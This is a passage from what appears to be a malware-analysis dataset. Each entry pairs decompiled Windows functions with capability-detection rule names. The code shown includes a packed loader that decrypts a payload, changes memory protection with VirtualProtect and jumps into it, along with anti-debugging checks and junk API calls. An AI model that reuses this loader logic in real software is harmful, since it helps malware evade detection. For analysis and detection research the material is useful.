do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x7f9de4 + (*0x7f9de4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x7f9de4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x7f9dec + *0x7f9dd8;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040d156;\n            }\n            var_10h = *0x7f9ddc - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x7f9de0 - 1;\n            iVar12 = *0x7f9de0 + (*0x7f9de0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x7f9de0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040cf42;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040cf42:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x7f9de4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040d156:\n    var_20h = iVar12 << (0x1fU - *0x7f9de4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x7f9de8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x7f9de8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3692
    },
    "0040424e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040424e(uint *param_1)\n\n{\n    *param_1 = 0x401220;\n    if (param_1[2] != 0) {\n        fcn.00404d3b(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004047ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004048ad: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004048b2)\n// WARNING: Removing unreachable block (ram,0x004048e0)\n// WARNING: Removing unreachable block (ram,0x004048b8)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004047ba(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406d00(0x7f77d8, 0x18);\n    fcn.00406868(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x7fb330 != 1) {\n        *0x7fb32c = 1;\n        *0x7fb328 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00405e5c(*0x2f6259c);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00405e5c(*0x2f62598);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00405e53();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00405e5c(*piVar2);\n                        iVar3 = fcn.00405e53();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00405e5c(*0x2f6259c);\n                        piVar1 = fcn.00405e5c(*0x2f62598);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004046f4(0x4011e4);\n        }\n        fcn.004046f4(0x4011ec);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040678e(8);\n    }\n    return;\n}\n",
        "token_count": 810
    },
    "0040726d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040726d(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040678e(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00409930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409930(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x7f9b70) {\n        return;\n    }\n    *0x7fbad8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x7fbadc = &arg_8h;\n    *0x7fba18 = 0x10001;\n    *0x7fb9c0 = 0xc0000409;\n    *0x7fb9c4 = 1;\n    var_328h = *0x7f9b70;\n    var_324h = *0x7f9b74;\n    *0x7fb9cc = unaff_retaddr;\n    *0x7fbaa4 = in_GS;\n    *0x7fbaa8 = in_FS;\n    *0x7fbaac = in_ES;\n    *0x7fbab0 = in_DS;\n    *0x7fbab4 = unaff_EDI;\n    *0x7fbab8 = unaff_ESI;\n    *0x7fbabc = unaff_EBX;\n    *0x7fbac0 = in_EDX;\n    *0x7fbac4 = in_ECX;\n    *0x7fbac8 = in_EAX;\n    *0x7fbacc = unaff_EBP;\n    *0x7fbad0 = unaff_retaddr;\n    *0x7fbad4 = in_CS;\n    *0x7fbae0 = in_SS;\n    *0x7fba10 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040a4b7(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402c48);\n    if (*0x7fba10 == 0) {\n        fcn.0040a4b7(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 859
    },
    "00403110": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00403110(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t unaff_ESI;\n    uint32_t uVar3;\n    uint32_t uStack572;\n    uchar auStack548 [4];\n    uchar auStack544 [536];\n    uint32_t *puStack8;\n    \n    uVar2 = param_1[1];\n    uVar3 = *param_1;\n    fcn.004030f0();\n    uStack572 = uVar3;\n    iVar1 = *0x7fa0e0;\n    if (*0x2f527dc == 0x14) {\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExW)(0, 0, auStack544);\n        iVar1 = *0x7fa0e0;\n    }\n    do {\n        if (*0x2f527dc == 0xfa9) {\n            *0x2f527d8 = 0xedeb2e40;\n        }\n        else if (*0x2f527dc == 0x3eb) {\n            *0x2f5274c = 0;\n        }\n        *0x2f527d4 = 0xf4ea3dee;\n        fcn.00403100();\n        if (*0x2f527dc == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_UnlockFile)(0, 0, 0, 0, 0);\n        }\n        uVar2 = uVar2 - (uVar3 >> 5 ^ uVar3 * 0x10 + iVar1 ^ uStack572 + 0x23f);\n        if (*0x2f527dc == 0xc) {\n            (*_sym.imp.KERNEL32.dll_WriteConsoleA)(0, 0, 0, auStack548, 0);\n        }\n        fcn.00403090();\n        if (*0x2f527dc == 0x121) {\n            (*_sym.imp.KERNEL32.dll_OpenEventW)(0, 0, 0);\n        }\n        fcn.004030a0();\n        uVar3 = uVar3 - unaff_ESI;\n        uStack572 = uVar2;\n    } while (uVar2 != 0xfffffdc2);\n    *puStack8 = uVar3;\n    puStack8[1] = 0xfffffdc2;\n    return;\n}\n",
        "token_count": 540
    },
    "004032f0": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.004032f0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint uStack3168;\n    uint uStack3164;\n    uint uStack3160;\n    uint uStack3156;\n    uint uStack3152;\n    uint uStack3148;\n    uint uStack3144;\n    uint uStack3140;\n    uint uStack3136;\n    uint uStack3132;\n    uint uStack3128;\n    uint uStack3124;\n    uint uStack3120;\n    uint uStack3116;\n    uchar *puStack3112;\n    uint uStack3108;\n    uint uStack3104;\n    int32_t iStack3084;\n    uchar auStack2056 [2056];\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    pcVar3 = _sym.imp.KERNEL32.dll_WriteProfileSectionA;\n    pcVar2 = _sym.imp.KERNEL32.dll_FindNextVolumeW;\n    pcVar1 = _sym.imp.KERNEL32.dll_SetHandleCount;\n    if (*0x2f527dc >> 3 != 0) {\n        iStack3084 = *0x2f52750;\n        do {\n            if (*0x2f527dc == 0x959) {\n                uStack3104 = 0;\n                uStack3108 = 0x403344;\n                (*pcVar1)();\n                uStack3108 = 0;\n                puStack3112 = &stack0xfffff7f8;\n                uStack3116 = 0;\n                uStack3120 = 0x403352;\n                (*pcVar2)();\n                uStack3120 = 0;\n                uStack3124 = 0;\n                uStack3128 = 0x403358;\n                (*pcVar3)();\n                uStack3128 = 0;\n                uStack3132 = 0x40335c;\n                (*pcVar4)();\n                uStack3132 = 0;\n                uStack3136 = 0;\n                uStack3140 = 0;\n                uStack3144 = 0;\n                uStack3148 = 0x40336a;\n                (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n                uStack3148 = 0;\n                uStack3152 = 0;\n                uStack3156 = 0x403374;\n                (*_sym.imp.KERNEL32.dll_EnumSystemLocalesA)();\n                uStack3156 = 0;\n                uStack3160 = 0;\n                uStack3164 = 0;\n                uStack3168 = 0x403380;\n                (*_sym.imp.KERNEL32.dll_AddConsoleAliasW)();\n                uStack3168 = 0;\n                (*pcVar3)(0);\n                (*_sym.imp.KERNEL32.dll_EnumResourceTypesA)(0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_SetThreadPriorityBoost)(0, 0);\n                (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)(&stack0xfffff3a0, 0);\n                (*_sym.imp.KERNEL32.dll_BeginUpdateResourceW)(0, 0);\n                (*_sym.imp.KERNEL32.dll_CreateFileA)(0x402d00, 0, 0, 0, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_FindResourceExA)(0, 0x402d24, 0x402d10, 0);\n                (*_sym.imp.KERNEL32.dll_OpenEventW)(0, 0, 0);\n            }\n            uStack3108 = 0x4033f4;\n            fcn.00403110();\n            iStack3084 = iStack3084 + -1;\n        } while (iStack3084 != 0);\n    }\n    return;\n}\n",
        "token_count": 853
    },
    "00403450": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nvoid fcn.00403450(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    uint in_stack_00000060;\n    uint in_stack_00000064;\n    uint in_stack_00000068;\n    uint in_stack_0000006c;\n    uint in_stack_00000070;\n    uint in_stack_00000074;\n    uint in_stack_00000078;\n    uint in_stack_0000007c;\n    uint in_stack_00000080;\n    uint in_stack_00000084;\n    uint in_stack_00000088;\n    uint in_stack_0000008c;\n    ushort uStack00000090;\n    uint in_stack_00000090;\n    ushort uStack00000092;\n    ushort uStack00000094;\n    uint in_stack_00000094;\n    ushort uStack00000096;\n    ushort uStack00000098;\n    uint in_stack_00000098;\n    ushort uStack0000009a;\n    ushort uStack0000009c;\n    uint in_stack_0000009c;\n    ushort uStack0000009e;\n    uint in_stack_000000a0;\n    uint in_stack_000000a4;\n    uint in_stack_000000a8;\n    uint in_stack_000000ac;\n    uint in_stack_000000b0;\n    uint in_stack_000000b4;\n    uint in_stack_000000b8;\n    uint in_stack_000000bc;\n    uint in_stack_000000c0;\n    uint in_stack_000000c4;\n    uint in_stack_000000c8;\n    uint in_stack_000000cc;\n    uint in_stack_000000d0;\n    uint in_stack_000000d4;\n    uint in_stack_000000d8;\n    uint in_stack_000000dc;\n    uint in_stack_000000e0;\n    uint in_stack_000000e4;\n    \n    fcn.0040c680();\n    in_stack_00000054 = 0x17574e1f;\n    in_stack_00000038 = 0x54cbcce0;\n    in_stack_0000001c = 0x23ff2c9d;\n    in_stack_00000024 = 0x3d9c1d15;\n    in_stack_00000048 = 0x5933150b;\n    in_stack_0000007c = 0x799709f1;\n    in_stack_0000005c = 0x11cd58f6;\n    in_stack_0000003c = 0x16f2724e;\n    in_stack_0000002c = 0x7b79887e;\n    in_stack_00000070 = 0x9bbdd77;\n    in_stack_0000006c = 0x7782bf1f;\n    in_stack_00000044 = 0xe83e9d36;\n    in_stack_00000058 = 0x30aa2dda;\n    in_stack_00000078 = 0x8a2bead6;\n    in_stack_00000020 = 0x3ce55c21;\n    in_stack_00000018 = 0x9c1ef870;\n    in_stack_00000060 = 0x1efc3dc4;\n    in_stack_00000040 = 0x1042c645;\n    in_stack_00000030 = 0xb1876ea;\n    in_stack_00000068 = 0x96b29b48;\n    in_stack_00000074 = 0xefcd3e77;\n    in_stack_00000050 = 0x8ba2410b;\n    in_stack_00000034 = 0xbc7b1652;\n    in_stack_0000004c = 0x1e5bcdda;\n    in_stack_00000014 = 0x11b2f8ff;\n    in_stack_00000028 = 0x222cfa0e;\n    in_stack_00000064 = 0x957bd00c;\n    if (*0x2f527dc == 0xac) {\n        (*_sym.imp.USER32.dll_RegisterClassW)();\n        (*_sym.imp.KERNEL32.dll_GetStringTypeExW)();\n        (*_sym.imp.USER32.dll_GetWindowLongW)();\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsA)();\n        fcn.004041cd();\n        fcn.0040424e();\n        in_stack_00000014 = 0x402d54;\n        fcn.004041de(&stack0x00000014);\n        in_stack_0000008c = 0x402d68;\n        fcn.0040424e();\n        fcn.00404231(0x7fa0d0);\n        in_stack_00000084 = 0x402d74;\n        fcn.0040424e();\n        fcn.004043bd(0);\n        fcn.0040453d(0, 0);\n        fcn.0040456f(0, 0);\n        fcn.004043bd(0);\n        fcn.004043d3(0, 0);\n        fcn.004043ec();\n        fcn.004048e6(0);\n    }\n    pcVar4 = _sym.imp.USER32.dll_CharLowerBuffW;\n    pcVar3 = _sym.imp.USER32.dll_SetCaretPos;\n    pcVar2 = _sym.imp.GDI32.dll_GetCharABCWidthsI;\n    iVar7 = 0;\n    do {\n        if (iVar7 < 0xda6a) {\n            (*pcVar3)();\n            (*pcVar4)();\n            (*pcVar2)();\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x140d7);\n    *0x2f527dc = *0x2f527dc + 0x11b1b;\n    fcn.00403430();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateMemoryResourceNotification;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    pcVar2 = _sym.imp.GDI32.dll_SetColorAdjustment;\n    uVar8 = 0;\n    if (*0x2f527dc != 0) {\n        do {\n            (*0x2f52750)[uVar8] = *(uVar8 + 0x11b1b + *0x2f6243c);\n            if (*0x2f527dc == 0xa8) {\n                (*pcVar4)();\n                (*pcVar3)();\n                (*pcVar2)();\n                (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA)();\n            }\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < *0x2f527dc);\n    }\n    pcVar5 = _sym.imp.KERNEL32.dll_VerSetConditionMask;\n    pcVar4 = _sym.imp.KERNEL32.dll_DebugBreak;\n    pcVar3 = _sym.imp.KERNEL32.dll_WriteConsoleA;\n    pcVar2 = _sym.imp.KERNEL32.dll_SetMailslotInfo;\n    iVar7 = 0;\n    do {\n        if (iVar7 + *0x2f527dc == 0xe) {\n            (*pcVar3)();\n            (*pcVar5)();\n            (*pcVar4)();\n            (*pcVar2)();\n            (*_sym.imp.KERNEL32.dll_ScrollConsoleScreenBufferW)();\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)();\n            (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n            (*_sym.imp.KERNEL32.dll_FindCloseChangeNotification)();\n            uStack00000092 = 0;\n            uStack00000094 = 0;\n            uStack00000096 = 0;\n            uStack00000098 = 0;\n            uStack0000009a = 0;\n            uStack0000009c = 0;\n            uStack0000009e = 0;\n            uStack00000090 = 0;\n            (*_sym.imp.KERNEL32.dll_GetDateFormatA)();\n            (*_sym.imp.KERNEL32.dll_SetThreadLocale)();\n            in_stack_00000084 = 0;\n            fcn.004092b0();\n            (*_sym.imp.KERNEL32.dll_SetCommConfig)();\n            (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)();\n            (*_sym.imp.KERNEL32.dll_GetCalendarInfoW)();\n        }\n        pcVar1 = _sym.imp.GDI32.dll_GetCharWidthW;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x4f9413);\n    iVar7 = 0x4f4;\n    do {\n        (*pcVar1)();\n        pcVar2 = _sym.imp.KERNEL32.dll_SetLastError;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    do {\n        (*pcVar2)();\n        if (iVar7 < 0x3b9f9c7) {\n            uStack0000009c = 0x4c31;\n            uStack0000009e = 0x1b1f;\n            in_stack_000000d0 = 0x62549a1c;\n            in_stack_000000b4 = 0x71b2ec6;\n            in_stack_000000ac = 0x37beb127;\n            uStack00000094 = 0x172;\n            uStack00000096 = 0x5f43;\n            in_stack_00000084 = 0x3ef75990;\n            in_stack_000000a8 = 0x671b5d09;\n            uStack00000098 = 0x3ae6;\n            uStack0000009a = 0x2e85;\n            in_stack_000000c8 = 0x52c4b444;\n            in_stack_000000d4 = 0x46a518f9;\n            in_stack_000000b0 = 0x35125e2b;\n            in_stack_0000007c = 0x1ad10849;\n            in_stack_00000080 = 0x381ee696;\n            in_stack_000000e4 = 0xe11e6c2;\n            in_stack_000000bc = 0x5a39ca87;\n            in_stack_000000cc = 0xc687888b;\n            in_stack_000000d8 = 0x860776d9;\n            in_stack_00000088 = 0x5e38854d;\n            in_stack_0000008c = 0xae3c1051;\n            uStack00000090 = 0x22d3;\n            uStack00000092 = 0x11a7;\n            in_stack_000000e0 = 0x43bb0286;\n            in_stack_000000c4 = 0xbc2138cd;\n            in_stack_000000a0 = 0xaf698675;\n            in_stack_00000070 = 0xc6aa655c;\n            in_stack_000000c0 = 0x187691d1;\n            in_stack_000000dc = 0xf250e268;\n            in_stack_000000a4 = 0xe5da3acd;\n            in_stack_000000b8 = 0x7914cc58;\n        }\n    } while ((iVar7 < 0xbf08be) && (iVar7 = iVar7 + 1,  iVar7 < 0x19be898c));\n    fcn.004032f0();\n    fcn.00403410();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n    pcVar2 = _sym.imp.KERNEL32.dll_EnumTimeFormatsA;\n    iVar7 = 0x7b;\n    do {\n        if (*0x2f527dc == 0x86) {\n            (*pcVar3)();\n            (*pcVar2)();\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetWindowsDirectoryW;\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProfileIntA;\n        pcVar5 = _sym.imp.KERNEL32.dll_TlsSetValue;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetWindowsDirectoryA;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    iVar7 = 0x180ef;\n    do {\n        if (*0x2f527dc == 0x1f) {\n            (*pcVar6)();\n            (*pcVar4)();\n            (*pcVar5)();\n            (*pcVar1)();\n        }\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    fcn.00402ff0();\n    *0x2f52754 = *0x2f52750;\n    (**0x2f52750)();\n    return;\n}\n",
        "token_count": 3053
    },
    "004030f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004030f0(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 46
    },
    "00403100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403100(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 47
    },
    "00403410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403410(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "004048e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004048e6(uint arg_8h)\n\n{\n    fcn.004047ba(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "00406b36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
